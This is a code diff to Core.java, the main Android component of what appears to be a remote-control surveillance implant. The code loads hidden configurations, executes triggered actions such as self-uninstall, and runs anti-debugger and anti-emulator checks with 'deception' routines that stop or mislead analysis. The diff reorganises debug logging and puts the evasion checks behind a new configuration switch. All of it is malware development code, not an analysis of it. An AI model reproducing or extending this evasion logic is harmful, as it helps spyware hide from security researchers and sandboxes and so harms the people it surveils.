@@ -101,7 +101,7 @@ public class Core extends Activity implements Runnable {
 
 	/**
 	 * Start.
-	 * 
+	 *
 	 * @param r
 	 *            the r
 	 * @param cr
@@ -182,7 +182,7 @@ public class Core extends Activity implements Runnable {
 
 	/**
 	 * Stop.
-	 * 
+	 *
 	 * @return true, if successful
 	 */
 	public boolean Stop() {
@@ -211,7 +211,7 @@ public class Core extends Activity implements Runnable {
 	 * @see java.lang.Runnable#run()
 	 */
 	public void run() {
-		if (Cfg.DEBUG) {
+		if (Cfg.DEBUG_SPECIFIC) {
 			Check.log(TAG + " RCS Thread Started"); //$NON-NLS-1$
 			// startTrace();
 		}
@@ -327,7 +327,7 @@ public class Core extends Activity implements Runnable {
 	/**
 	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
 	 * bloccante.
-	 * 
+	 *
 	 * @return true, if UNINSTALL
 	 */
 	private boolean checkActions(int qq) {
@@ -358,8 +358,7 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEMO) {
 					Beep.bip();
 				}
-
-				if (!Cfg.DEBUG) {
+				if (!Cfg.DEBUG && Cfg.CHECK_ANTI_DEBUG) {
 					// ANTIDEBUG
 					AntiDebug ad = new AntiDebug();
 					if (ad.isDebug()) {
@@ -373,7 +372,7 @@ public class Core extends Activity implements Runnable {
 					final Exit exitValue = executeAction(action, trigger);
 
 					if (exitValue == Exit.UNINSTALL) {
-						if (Cfg.DEBUG) {
+						if (Cfg.DEBUG_SPECIFIC) {
 							Check.log(TAG + " Info: checkActions: Uninstall"); //$NON-NLS-1$
 						}
 
@@ -434,7 +433,7 @@ public class Core extends Activity implements Runnable {
 
 	/**
 	 * Inizializza il core.
-	 * 
+	 *
 	 * @return false if any fatal error
 	 */
 	private int taskInit() {
@@ -558,7 +557,7 @@ public class Core extends Activity implements Runnable {
 	/**
 	 * Tries to load the new configuration, if it fails it get the resource
 	 * conf.
-	 * 
+	 *
 	 * @return false if no correct conf available
 	 * @throws GeneralException
 	 *             the rCS exception
@@ -571,7 +570,7 @@ public class Core extends Activity implements Runnable {
 			// Beep.beep();
 		}
 
-		if (Cfg.DEBUG) {
+		if (Cfg.DEBUG_SPECIFIC) {
 			Check.log(TAG + " (loadConf): TRY NEWCONF");
 		}
 
@@ -597,7 +596,7 @@ public class Core extends Activity implements Runnable {
 
 		// get the actual configuration
 		if (!loaded) {
-			if (Cfg.DEBUG) {
+			if (Cfg.DEBUG_SPECIFIC) {
 				Check.log(TAG + " (loadConf): TRY CURRENTCONF");
 			}
 			file = new AutoFile(Path.conf() + ConfType.CurrentConf);
@@ -614,8 +613,8 @@ public class Core extends Activity implements Runnable {
 			}
 		}
 
-		if (!loaded && Cfg.DEBUG) {
-			if (Cfg.DEBUG) {
+		if (!loaded && (Cfg.DEBUG || !Cfg.CHECK_ANTI_DEBUG)) {
+			if (Cfg.DEBUG_SPECIFIC) {
 				Check.log(TAG + " (loadConf): TRY JSONCONF");
 			}
 
@@ -628,7 +627,7 @@ public class Core extends Activity implements Runnable {
 				// Load the configuration
 				loaded = conf.loadConfiguration(true);
 
-				if (Cfg.DEBUG) {
+				if (Cfg.DEBUG_SPECIFIC) {
 					Check.log(TAG + " Info: Json file loaded: " + loaded); //$NON-NLS-1$
 				}
 
@@ -640,7 +639,7 @@ public class Core extends Activity implements Runnable {
 
 		// tries to load the resource conf
 		if (!loaded) {
-			if (Cfg.DEBUG) {
+			if (Cfg.DEBUG_SPECIFIC) {
 				Check.log(TAG + " (loadConf): TRY ASSET CONF");
 			}
 			// Open conf from resources and load it into resource
@@ -652,7 +651,7 @@ public class Core extends Activity implements Runnable {
 			// Load the configuration
 			loaded = conf.loadConfiguration(true);
 
-			if (Cfg.DEBUG) {
+			if (Cfg.DEBUG_SPECIFIC) {
 				Check.log(TAG + " Info: Resource file loaded: " + loaded); //$NON-NLS-1$
 			}
 
@@ -700,7 +699,7 @@ public class Core extends Activity implements Runnable {
 
 	/**
 	 * Execute action. (Questa non viene decompilata correttamente.)
-	 * 
+	 *
 	 * @param action
 	 *            the action
 	 * @param baseEvent
@@ -831,35 +830,39 @@ public class Core extends Activity implements Runnable {
 	}
 
 	public boolean check() {
-		if (!Cfg.DEBUG) {
-            AntiDebug ad = new AntiDebug();
-            if (ad.isDebug()) {
-                deceptionCode1();
-                return false;
-            }
-        }
-        if (!Cfg.DEBUG || Cfg.DEBUGANTIEMU) {
-			AntiEmulator am = new AntiEmulator();
-			if (am.isEmu()) {
-				deceptionCode2(Integer.MAX_VALUE / 1024);
-				return false;
+		if(Cfg.CHECK_ANTI_DEBUG) {
+			if (!Cfg.DEBUG) {
+				AntiDebug ad = new AntiDebug();
+				if (ad.isDebug()) {
+					deceptionCode1();
+					return false;
+				}
+			}
+			if (!Cfg.DEBUG || Cfg.DEBUGANTIEMU) {
+				AntiEmulator am = new AntiEmulator();
+				if (am.isEmu()) {
+					deceptionCode2(Integer.MAX_VALUE / 1024);
+					return false;
+				}
 			}
 		}
 		return true;
 	}
 
 	public static boolean checkStatic() {
-		if (!Cfg.DEBUG) {
-			AntiDebug ad = new AntiDebug();
-			if (ad.isDebug()) {
-				// deceptionCode1();
+		if(Cfg.CHECK_ANTI_DEBUG) {
+			if (!Cfg.DEBUG) {
+				AntiDebug ad = new AntiDebug();
+				if (ad.isDebug()) {
+					// deceptionCode1();
+					return false;
+				}
+			}
+
+			AntiEmulator am = new AntiEmulator();
+			if (am.isEmu()) {
 				return false;
 			}
-		}
-
-		AntiEmulator am = new AntiEmulator();
-		if (am.isEmu()) {
-			return false;
 		}
 		return true;
 	}
